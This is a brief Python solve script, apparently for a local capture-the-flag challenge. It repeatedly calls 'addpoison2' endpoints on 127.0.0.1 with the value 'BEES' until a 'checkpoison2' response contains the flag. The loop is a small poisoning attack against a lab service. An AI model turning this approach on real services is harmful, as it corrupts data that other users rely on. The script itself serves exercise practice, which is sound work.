import requests

requests.get("http://127.0.0.1:5000/resetpoison2")
requests.get("http://127.0.0.1:5000/rebuildpoison2")

for i in range(0,100):
  r1 = requests.get("http://127.0.0.1:5000/addpoison2?data=BEES")
  r2 = requests.get("http://127.0.0.1:5000/checkpoison2")
  #If you wanna show working.
  #print(r2.text)
  if("flag" in r2.text):
    print(r2.text)
    break
